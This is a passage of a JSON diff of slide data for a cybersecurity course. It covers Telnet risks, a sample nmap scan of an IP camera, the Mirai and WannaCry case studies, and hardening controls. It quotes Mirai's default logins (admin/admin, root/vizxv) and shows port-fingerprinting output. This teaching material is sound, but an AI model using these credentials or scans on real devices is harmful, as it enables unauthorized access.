+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p><b>Telnet</b> is a very old remote-login protocol that transmits all data, including the username and password used to log in, as unencrypted plaintext over the network. Because Telnet transmits credentials as cleartext, any attacker positioned on the network path, or simply scanning for open port 23, can harvest valid logon credentials directly from the wire without needing to guess them at all.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.5",
+   "parent_n": 13,
+   "title": "Fingerprinting a Device's Insecure Defaults",
+   "slide_type": "application",
+   "difficulty": "intermediate",
+   "tags": [
+    "nmap",
+    "port-scanning",
+    "tr-069"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> TR-069 was the exploited protocol in the November 2016 Deutsche Telekom/Mirai router outage that knocked nearly a million routers offline.</p><p><b>Exam tip:</b> When reading a port scan, first identify which secure protocol is MISSING (SSH/HTTPS closed) before flagging which insecure ones are open, both halves matter for full credit.</p>",
+   "beat": 1,
+   "bullets": [
+    "nmap -sV scans reveal open ports, running services, and version banners",
+    "SSH closed + Telnet open = a textbook insecure-default-configuration profile",
+    "Outdated FTP daemon with a known CVE backdoor adds a second independent vulnerability",
+    "TR-069 (port 7547) grants remote configuration control equivalent to legit ISP access"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.5",
+   "parent_n": 13,
+   "title": "Fingerprinting a Device's Insecure Defaults",
+   "slide_type": "application",
+   "difficulty": "intermediate",
+   "tags": [
+    "nmap",
+    "port-scanning",
+    "tr-069"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> TR-069 was the exploited protocol in the November 2016 Deutsche Telekom/Mirai router outage that knocked nearly a million routers offline.</p><p><b>Exam tip:</b> When reading a port scan, first identify which secure protocol is MISSING (SSH/HTTPS closed) before flagging which insecure ones are open, both halves matter for full credit.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>An nmap scan of an exposed IP camera illustrates a textbook insecure-default-configuration profile: SSH is closed while Telnet and an outdated FTP daemon with a known backdoor vulnerability remain open. Port 7547 running the <b>TR-069</b> (CPE WAN Management Protocol) is a common target for ISP-router-focused worm variants, since a flaw there grants remote configuration control equivalent to legitimate ISP administrative access.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.5",
+   "parent_n": 13,
+   "title": "Fingerprinting a Device's Insecure Defaults",
+   "slide_type": "application",
+   "difficulty": "intermediate",
+   "tags": [
+    "nmap",
+    "port-scanning",
+    "tr-069"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> TR-069 was the exploited protocol in the November 2016 Deutsche Telekom/Mirai router outage that knocked nearly a million routers offline.</p><p><b>Exam tip:</b> When reading a port scan, first identify which secure protocol is MISSING (SSH/HTTPS closed) before flagging which insecure ones are open, both halves matter for full credit.</p>",
+   "beat": 4,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": "",
+   "code_block": {
+    "language": "bash",
+    "mode": "static",
+    "content": "$ nmap -sV -p 21,22,23,80,443,7547 10.0.0.42\n\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 2.3.4 (VULNERABLE: CVE-2011-2523 backdoor)\n22/tcp   closed ssh\n23/tcp   open  telnet  BusyBox telnetd (factory diagnostic shell)\n80/tcp   open  http    GoAhead-Webs (embedded HTTP admin panel)\n443/tcp  closed https\n7547/tcp open  cwmp    TR-069 CPE WAN Management Protocol\n\nService Info: OS: Linux; Device: IP camera; CPE: cpe:/h:generic:ip_camera"
+   }
+  },
+  {
+   "index": "4.1.2.a.6",
+   "parent_n": 14,
+   "title": "Vulnerability vs. Threat vs. Exploit",
+   "slide_type": "deep_question",
+   "difficulty": "foundational",
+   "tags": [
+    "vocabulary",
+    "vulnerability",
+    "threat",
+    "exploit"
+   ],
+   "quiz": {
+    "question": "Telnet is left enabled with default credentials on 50,000 deployed cameras. A botnet operator writes a script that automatically logs into any camera using those defaults. What is the EXPLOIT?",
+    "choices": [
+     "The 50,000 deployed cameras",
+     "Telnet being enabled with default credentials",
+     "The botnet operator's intent to compromise devices",
+     "The automated login script itself"
+    ],
+    "answer": "The automated login script itself",
+    "explanation": "The vulnerability is the weakness (Telnet + defaults); the threat is the botnet operator's capability/intent; the exploit is the concrete script/technique used."
+   },
+   "speaker_notes": "<p><b>Exam tip:</b> Practice writing one sentence that uses all three terms correctly about the same scenario, this is a reliable way to check your own understanding before the exam.</p>",
+   "beat": 1,
+   "bullets": [
+    "Vulnerability: the weakness itself (e.g., Telnet enabled with default credentials)",
+    "Threat: the potential for someone to take advantage of the weakness (a botnet operator)",
+    "Exploit: the actual code/technique used to take advantage of it (the credential-stuffing script)",
+    "AP graders look specifically for correct, non-interchangeable usage of these three terms"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.6",
+   "parent_n": 14,
+   "title": "Vulnerability vs. Threat vs. Exploit",
+   "slide_type": "deep_question",
+   "difficulty": "foundational",
+   "tags": [
+    "vocabulary",
+    "vulnerability",
+    "threat",
+    "exploit"
+   ],
+   "quiz": {
+    "question": "Telnet is left enabled with default credentials on 50,000 deployed cameras. A botnet operator writes a script that automatically logs into any camera using those defaults. What is the EXPLOIT?",
+    "choices": [
+     "The 50,000 deployed cameras",
+     "Telnet being enabled with default credentials",
+     "The botnet operator's intent to compromise devices",
+     "The automated login script itself"
+    ],
+    "answer": "The automated login script itself",
+    "explanation": "The vulnerability is the weakness (Telnet + defaults); the threat is the botnet operator's capability/intent; the exploit is the concrete script/technique used."
+   },
+   "speaker_notes": "<p><b>Exam tip:</b> Practice writing one sentence that uses all three terms correctly about the same scenario, this is a reliable way to check your own understanding before the exam.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>The AP exam frequently tests precise vocabulary. A <b>vulnerability</b> is the weakness itself. A <b>threat</b> is the potential for someone to take advantage of that weakness. An <b>exploit</b> is the actual code or technique used to take advantage of the vulnerability. Do not use these three terms interchangeably in free-response answers.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.7",
+   "parent_n": 15,
+   "title": "Section II Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "glossary",
+    "review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> Be ready to annotate a novel auth log or nmap scan you haven't seen before using this exact same four-step reading method.</p>",
+   "beat": 1,
+   "bullets": [
+    "Default credentials, Shodan, brute force, SUID bit",
+    "Telnet, nmap/port scanning, TR-069, vulnerability/threat/exploit",
+    "Auth-log narration pattern: vector → success → escalation → persistence",
+    "All technical mechanics trace to the chapter's log and nmap excerpts"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.2.a.7",
+   "parent_n": 15,
+   "title": "Section II Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "glossary",
+    "review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> Be ready to annotate a novel auth log or nmap scan you haven't seen before using this exact same four-step reading method.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p><b>Section II recap:</b> Default credentials are found at scale via scanners like Shodan, then brute-forced. A successful login can be followed by SUID-based privilege escalation for persistence. Insecure defaults extend to open, unnecessary services like Telnet, detectable via nmap scans. Precise use of vulnerability/threat/exploit vocabulary is exam-critical.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.1",
+   "parent_n": 16,
+   "title": "Case Study: The Mirai Botnet (2016), Setup",
+   "slide_type": "application",
+   "difficulty": "intermediate",
+   "tags": [
+    "mirai",
+    "case-study",
+    "botnet"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Mirai means 'future' in Japanese. Its source code was published on Hack Forums by author 'Anna-senpai' in September 2016, paradoxically causing a proliferation of Mirai variants once it became public.</p><p><b>Exam tip:</b> Note that no individual device was targeted, this was mass, automated, indiscriminate scanning.</p>",
+   "beat": 1,
+   "bullets": [
+    "September 2016: Mirai source code released, revealing an IoT-targeting scanner+infector",
+    "Continuously probed random IP ranges for open Telnet (port 23)",
+    "Hardcoded credential list included admin/admin, root/12345, root/vizxv",
+    "Successful login → downloads small ARM/MIPS binary → enrolls device in botnet"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.1",
+   "parent_n": 16,
+   "title": "Case Study: The Mirai Botnet (2016), Setup",
+   "slide_type": "application",
+   "difficulty": "intermediate",
+   "tags": [
+    "mirai",
+    "case-study",
+    "botnet"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Mirai means 'future' in Japanese. Its source code was published on Hack Forums by author 'Anna-senpai' in September 2016, paradoxically causing a proliferation of Mirai variants once it became public.</p><p><b>Exam tip:</b> Note that no individual device was targeted, this was mass, automated, indiscriminate scanning.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>In September 2016, source code for the <b>Mirai</b> botnet malware was released, revealing a program purpose-built to compromise IoT devices, home routers, IP cameras, and DVRs, that had never had their factory-default Telnet credentials changed. Mirai's scanning engine continuously probed random IP ranges for open port 23, attempted its hardcoded credential list, and upon success, downloaded and executed a small ARM/MIPS binary that enrolled the device into a command-and-control botnet.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.2",
+   "parent_n": 17,
+   "title": "Case Study: Mirai Strikes Dyn (Oct 21, 2016)",
+   "slide_type": "application",
+   "difficulty": "intermediate",
+   "tags": [
+    "mirai",
+    "ddos",
+    "dyn"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> MITRE ATT&amp;CK T1498 (Network Denial of Service). Because DNS underpins domain-name resolution, attacking one DNS provider cascades into outages for every site that depends on it.</p><p><b>Exam tip:</b> DDoS attacks primarily an availability breach, connect this back to the CIA triad vocabulary from Unit 2.</p>",
+   "beat": 1,
+   "bullets": [
+    "Army of Mirai-infected devices launched a massive DDoS against Dyn, a major DNS provider",
+    "Peaked at an estimated 1.2 terabits per second, among the largest DDoS attacks recorded",
+    "Caused outages for Twitter, Netflix, Reddit, GitHub, PayPal for hours on the US East Coast",
+    "Traced to 100,000+ compromised IoT devices, none individually targeted"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.2",
+   "parent_n": 17,
+   "title": "Case Study: Mirai Strikes Dyn (Oct 21, 2016)",
+   "slide_type": "application",
+   "difficulty": "intermediate",
+   "tags": [
+    "mirai",
+    "ddos",
+    "dyn"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> MITRE ATT&amp;CK T1498 (Network Denial of Service). Because DNS underpins domain-name resolution, attacking one DNS provider cascades into outages for every site that depends on it.</p><p><b>Exam tip:</b> DDoS attacks primarily an availability breach, connect this back to the CIA triad vocabulary from Unit 2.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>On October 21, 2016, an army of Mirai-infected devices launched a massive <b>Distributed Denial of Service (DDoS)</b> attack against Dyn, a major DNS infrastructure provider. Because Dyn's DNS services resolved domain names for a large portion of the internet, the attack caused widespread outages for major platforms for several hours. The attack was traced to an estimated 100,000+ compromised IoT devices, none of which had been individually targeted, they were simply scanned, found vulnerable via default credentials, and conscripted en masse.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.2",
+   "parent_n": 17,
+   "title": "Case Study: Mirai Strikes Dyn (Oct 21, 2016)",
+   "slide_type": "application",
+   "difficulty": "intermediate",
+   "tags": [
+    "mirai",
+    "ddos",
+    "dyn"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> MITRE ATT&amp;CK T1498 (Network Denial of Service). Because DNS underpins domain-name resolution, attacking one DNS provider cascades into outages for every site that depends on it.</p><p><b>Exam tip:</b> DDoS attacks primarily an availability breach, connect this back to the CIA triad vocabulary from Unit 2.</p>",
+   "beat": 3,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "img_4.1.3_mirai_dyn_attack",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.3",
+   "parent_n": 18,
+   "title": "Why Mirai Worked: Scale, Not Sophistication",
+   "slide_type": "deep_question",
+   "difficulty": "intermediate",
+   "tags": [
+    "mirai",
+    "root-cause-analysis"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Misconception:</b> Students sometimes assume a large-scale attack must involve sophisticated, novel exploitation. Mirai used no zero-day, only unchanged factory defaults at massive scale.</p><p><b>Exam tip:</b> Scale can substitute for sophistication as an attack multiplier, be ready to explain this trade-off in a free response.</p>",
+   "beat": 1,
+   "bullets": [
+    "No individual camera owner was 'hacked' in a targeted sense",
+    "Manufacturers shipped hundreds of thousands of near-identical devices with the same weak defaults",
+    "Virtually none of those owners ever logged in to change the password",
+    "A single vulnerability class, multiplied across enough devices, becomes a strategic weapon"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.3",
+   "parent_n": 18,
+   "title": "Why Mirai Worked: Scale, Not Sophistication",
+   "slide_type": "deep_question",
+   "difficulty": "intermediate",
+   "tags": [
+    "mirai",
+    "root-cause-analysis"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Misconception:</b> Students sometimes assume a large-scale attack must involve sophisticated, novel exploitation. Mirai used no zero-day, only unchanged factory defaults at massive scale.</p><p><b>Exam tip:</b> Scale can substitute for sophistication as an attack multiplier, be ready to explain this trade-off in a free response.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Mirai is the clearest illustration in the curriculum of why insecure defaults matter at scale. No individual camera owner was 'hacked' in a targeted sense, the attack worked because manufacturers shipped hundreds of thousands of nearly identical devices with the same weak default credentials, and virtually none of those owners ever logged in to change them. A single vulnerability class, multiplied across enough devices, becomes a strategic weapon.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.4",
+   "parent_n": 19,
+   "title": "Case Study: WannaCry, A Worm-Ransomware Hybrid",
+   "slide_type": "application",
+   "difficulty": "intermediate",
+   "tags": [
+    "wannacry",
+    "case-study",
+    "eternalblue",
+    "worm-ransomware-hybrid"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> EternalBlue exploited CVE-2017-0144 in Windows SMBv1, developed by the NSA and leaked by the Shadow Brokers in April 2017, one month before the attack. Attributed to North Korea's Lazarus Group.</p><p><b>Exam tip:</b> This is the canonical example of a scenario needing BOTH a propagation label and an objective label.</p>",
+   "beat": 1,
+   "bullets": [
+    "May 2017: infected 200,000+ computers across 150 countries within days",
+    "Crippled parts of the UK's NHS, causing appointment/surgery cancellations",
+    "Propagation = worm (EternalBlue SMBv1 exploit, zero user interaction)",
+    "Objective = ransomware (AES+RSA encryption, ~$300 Bitcoin demand per machine)"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.4",
+   "parent_n": 19,
+   "title": "Case Study: WannaCry, A Worm-Ransomware Hybrid",
+   "slide_type": "application",
+   "difficulty": "intermediate",
+   "tags": [
+    "wannacry",
+    "case-study",
+    "eternalblue",
+    "worm-ransomware-hybrid"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> EternalBlue exploited CVE-2017-0144 in Windows SMBv1, developed by the NSA and leaked by the Shadow Brokers in April 2017, one month before the attack. Attributed to North Korea's Lazarus Group.</p><p><b>Exam tip:</b> This is the canonical example of a scenario needing BOTH a propagation label and an objective label.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>In May 2017, the <b>WannaCry</b> ransomware worm infected an estimated 200,000+ computers across 150 countries within days, notably crippling parts of the UK's National Health Service. WannaCry combined two elements this topic classifies separately: it was a <i>worm</i> in its propagation (using EternalBlue to spread laterally with no user interaction) and <i>ransomware</i> in its objective (encrypting files with AES and RSA and demanding Bitcoin).</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.5",
+   "parent_n": 20,
+   "title": "WannaCry's Root Cause: Unpatched Endpoints",
+   "slide_type": "mechanism",
+   "difficulty": "intermediate",
+   "tags": [
+    "wannacry",
+    "patch-management",
+    "eternalblue"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> EternalBlue's underlying vulnerability, CVE-2017-0144, carries a CVSS v2 base score of 9.3, indicating critical severity.</p><p><b>Exam tip:</b> 'A patch existed but was not applied' is the single most common root cause tested in patch-management free-response scenarios.</p>",
+   "beat": 1,
+   "bullets": [
+    "Microsoft released patch MS17-010 a full month before the attack",
+    "Large population of enterprise/government machines never applied it",
+    "Many were running unsupported Windows XP and Windows 7 installations",
+    "A security researcher's discovery of an unregistered kill-switch domain slowed the spread"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.5",
+   "parent_n": 20,
+   "title": "WannaCry's Root Cause: Unpatched Endpoints",
+   "slide_type": "mechanism",
+   "difficulty": "intermediate",
+   "tags": [
+    "wannacry",
+    "patch-management",
+    "eternalblue"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> EternalBlue's underlying vulnerability, CVE-2017-0144, carries a CVSS v2 base score of 9.3, indicating critical severity.</p><p><b>Exam tip:</b> 'A patch existed but was not applied' is the single most common root cause tested in patch-management free-response scenarios.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>The rapid, global spread of WannaCry was made possible entirely by unpatched endpoints: Microsoft had shipped a patch closing the EternalBlue vulnerability a full month prior, but a large population of enterprise and government machines, many running unsupported Windows XP and Windows 7, had not applied it. WannaCry was eventually slowed by a security researcher who discovered and registered an unregistered domain referenced in the malware's code, acting as an unintentional 'kill switch.'</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.6",
+   "parent_n": 21,
+   "title": "Labeling Hybrid Malware Correctly",
+   "slide_type": "deep_question",
+   "difficulty": "foundational",
+   "tags": [
+    "hybrid-malware",
+    "vocabulary"
+   ],
+   "quiz": {
+    "question": "A sample spreads by exploiting an unpatched network service with no user click required, then quietly copies files to an attacker-controlled server without altering or locking anything on the victim machine. Which is the correct classification?",
+    "choices": [
+     "A worm with a spyware/exfiltration objective",
+     "A virus with a ransomware objective",
+     "A trojan with a rootkit objective",
+     "A worm with a ransomware objective"
+    ],
+    "answer": "A worm with a spyware/exfiltration objective",
+    "explanation": "Autonomous network-based spread with no user interaction is a worm's propagation mechanism; quietly stealing data without altering/locking it is a spyware/exfiltration objective, not ransomware."
+   },
+   "speaker_notes": "<p><b>Exam tip:</b> Structure hybrid-malware answers as two clauses: '[propagation mechanism] used to deliver a [objective] payload.'</p>",
+   "beat": 1,
+   "bullets": [
+    "Classifications describe different dimensions: propagation mechanism vs. payload objective",
+    "WannaCry = 'a ransomware payload delivered via wormable propagation'",
+    "On the exam, identify BOTH the propagation mechanism AND the payload objective",
+    "Forcing a single label loses partial credit on free-response questions"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.6",
+   "parent_n": 21,
+   "title": "Labeling Hybrid Malware Correctly",
+   "slide_type": "deep_question",
+   "difficulty": "foundational",
+   "tags": [
+    "hybrid-malware",
+    "vocabulary"
+   ],
+   "quiz": {
+    "question": "A sample spreads by exploiting an unpatched network service with no user click required, then quietly copies files to an attacker-controlled server without altering or locking anything on the victim machine. Which is the correct classification?",
+    "choices": [
+     "A worm with a spyware/exfiltration objective",
+     "A virus with a ransomware objective",
+     "A trojan with a rootkit objective",
+     "A worm with a ransomware objective"
+    ],
+    "answer": "A worm with a spyware/exfiltration objective",
+    "explanation": "Autonomous network-based spread with no user interaction is a worm's propagation mechanism; quietly stealing data without altering/locking it is a spyware/exfiltration objective, not ransomware."
+   },
+   "speaker_notes": "<p><b>Exam tip:</b> Structure hybrid-malware answers as two clauses: '[propagation mechanism] used to deliver a [objective] payload.'</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>WannaCry demonstrates that malware classifications are not mutually exclusive. On the exam, when a scenario describes malware that both spreads autonomously across a network AND encrypts files for ransom, correctly label it using both applicable terms, 'a ransomware payload delivered via wormable propagation', rather than forcing a single label. Full credit requires identifying both the propagation mechanism and the payload objective.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.7",
+   "parent_n": 22,
+   "title": "Section III Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "glossary",
+    "review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> Keep the two root causes distinct in your mind: Mirai = credential hygiene failure; WannaCry = patch management failure. Mixing them up in a free response costs points.</p>",
+   "beat": 1,
+   "bullets": [
+    "Mirai: default-credential IoT botnet, Dyn DDoS at 1.2 Tbps, 100,000+ devices",
+    "WannaCry: EternalBlue worm + AES/RSA ransomware, 200,000+ machines, 150 countries",
+    "Both incidents trace back to a single, well-understood root cause each",
+    "Mirai root cause: shared default credentials; WannaCry root cause: unapplied patch"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.3.a.7",
+   "parent_n": 22,
+   "title": "Section III Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "glossary",
+    "review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Exam tip:</b> Keep the two root causes distinct in your mind: Mirai = credential hygiene failure; WannaCry = patch management failure. Mixing them up in a free response costs points.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p><b>Section III recap:</b> Mirai shows how weak, shared default credentials become a strategic weapon when multiplied across hundreds of thousands of IoT devices. WannaCry shows how a single unpatched, wormable vulnerability can combine with a ransomware objective to cause global-scale, non-targeted damage. Both case studies are the canonical AP examples for their respective root causes.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.1",
+   "parent_n": 23,
+   "title": "Eliminating Default Configurations",
+   "slide_type": "application",
+   "difficulty": "intermediate",
+   "tags": [
+    "hardening",
+    "cm-7",
+    "telnet-disablement"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> NIST SP 800-53 control CM-7 directs organizations to disable all services not explicitly required for business operations, Telnet almost never meets this bar.</p><p><b>Exam tip:</b> 'Verified through automated scanning' beats 'checked manually' as an answer whenever the question asks about scale/reliability of a control.</p>",
+   "beat": 1,
+   "bullets": [
+    "Mandatory credential rotation before any device is provisioned onto production network",
+    "Telnet service disablement, turn the daemon off entirely, don't just change its password",
+    "Verified through automated configuration compliance scanning (CIS-CAT, OpenSCAP)",
+    "NIST SP 800-53 control CM-7 (Least Functionality) mandates disabling unneeded services"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.1",
+   "parent_n": 23,
+   "title": "Eliminating Default Configurations",
+   "slide_type": "application",
+   "difficulty": "intermediate",
+   "tags": [
+    "hardening",
+    "cm-7",
+    "telnet-disablement"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> NIST SP 800-53 control CM-7 directs organizations to disable all services not explicitly required for business operations, Telnet almost never meets this bar.</p><p><b>Exam tip:</b> 'Verified through automated scanning' beats 'checked manually' as an answer whenever the question asks about scale/reliability of a control.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Organizations should enforce mandatory credential rotation and <b>Telnet service disablement</b> as a standard build requirement before any device is provisioned onto a production network, verified through automated configuration compliance scanning rather than manual spot checks.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.2",
+   "parent_n": 24,
+   "title": "NIST and CIS Baseline Hardening",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "cis-benchmarks",
+    "nist-800-53",
+    "hardening"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> CIS Benchmarks map directly to the CIS Critical Security Controls and are frequently referenced alongside NIST SP 800-53.</p><p><b>Exam tip:</b> Naming a specific framework (CIS Benchmarks, NIST SP 800-53) rather than saying 'follow best practices' earns more credit on free response.</p>",
+   "beat": 1,
+   "bullets": [
+    "CIS Benchmarks: consensus-developed, testable configuration guidelines per OS/device/app",
+    "Example rules: disable SMBv1, set minimum password length to 14",
+    "NIST SP 800-53 CM (Configuration Management) + SI (System Integrity) control families",
+    "Formalizes attack-surface reduction as repeatable, auditable, not ad hoc"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.2",
+   "parent_n": 24,
+   "title": "NIST and CIS Baseline Hardening",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "cis-benchmarks",
+    "nist-800-53",
+    "hardening"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> CIS Benchmarks map directly to the CIS Critical Security Controls and are frequently referenced alongside NIST SP 800-53.</p><p><b>Exam tip:</b> Naming a specific framework (CIS Benchmarks, NIST SP 800-53) rather than saying 'follow best practices' earns more credit on free response.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>The <b>CIS Benchmarks</b> published by the Center for Internet Security provide device- and OS-specific hardening checklists that organizations apply as a baseline configuration standard prior to deployment. Combined with NIST SP 800-53's CM and SI control families, these frameworks formalize the process of reducing attack surface as a repeatable, auditable procedure rather than an ad hoc decision left to individual administrators.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.3",
+   "parent_n": 25,
+   "title": "IoT-Specific Regulatory Controls",
+   "slide_type": "concept",
+   "difficulty": "intermediate",
+   "tags": [
+    "regulation",
+    "sb-327",
+    "iot-security"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> SB-327 is sometimes called the first IoT-specific cybersecurity law in the United States, drafted directly in response to incidents like Mirai/Dyn.</p><p><b>Exam tip:</b> This is the strongest available answer to 'what single control best prevents another Mirai-scale event', regulation at the manufacturer level, not user education.</p>",
+   "beat": 1,
+   "bullets": [
+    "Manufacturers, not end users, control security posture at point of manufacture",
+    "California SB-327 (2020): unique per-device default passwords OR forced setup password change",
+    "UK Product Security and Telecommunications Infrastructure Act, similar requirement",
+    "Directly targets the root cause exploited by Mirai"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.3",
+   "parent_n": 25,
+   "title": "IoT-Specific Regulatory Controls",
+   "slide_type": "concept",
+   "difficulty": "intermediate",
+   "tags": [
+    "regulation",
+    "sb-327",
+    "iot-security"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> SB-327 is sometimes called the first IoT-specific cybersecurity law in the United States, drafted directly in response to incidents like Mirai/Dyn.</p><p><b>Exam tip:</b> This is the strongest available answer to 'what single control best prevents another Mirai-scale event', regulation at the manufacturer level, not user education.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Recognizing that manufacturers, not end users, control the security posture at the point of manufacture, regulators have begun mandating security-by-design requirements. California's SB-327 (effective 2020) and the UK's Product Security and Telecommunications Infrastructure Act require that IoT devices sold in those jurisdictions either use unique per-device default passwords or force a password change during initial setup, directly targeting the root cause exploited by Mirai.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.4",
+   "parent_n": 26,
+   "title": "Patch and Vulnerability Management",
+   "slide_type": "mechanism",
+   "difficulty": "intermediate",
+   "tags": [
+    "patch-management",
+    "cvss",
+    "vulnerability-scanning"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> CVSS is maintained by FIRST.org. EternalBlue's CVE-2017-0144 carries a CVSS v2 base score of 9.3.</p><p><b>Exam tip:</b> Cite a CVSS score threshold and a specific tool (Nessus/Qualys) when asked to describe a formal patch management program.</p>",
+   "beat": 1,
+   "bullets": [
+    "A released patch is only effective if deployed, WannaCry's central lesson",
+    "CVSS (0.0–10.0): rates vulnerability severity to determine patch urgency",
+    "CVSS 9.0+ (\"Critical\") often requires patching within 24–72 hours per policy",
+    "Validated through automated vulnerability scanning (Nessus, Qualys), not spreadsheets"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "4.1.4.a.4",
+   "parent_n": 26,
+   "title": "Patch and Vulnerability Management",
+   "slide_type": "mechanism",
+   "difficulty": "intermediate",
+   "tags": [
+    "patch-management",
+    "cvss",
+    "vulnerability-scanning"
+   ],
+   "quiz": null,
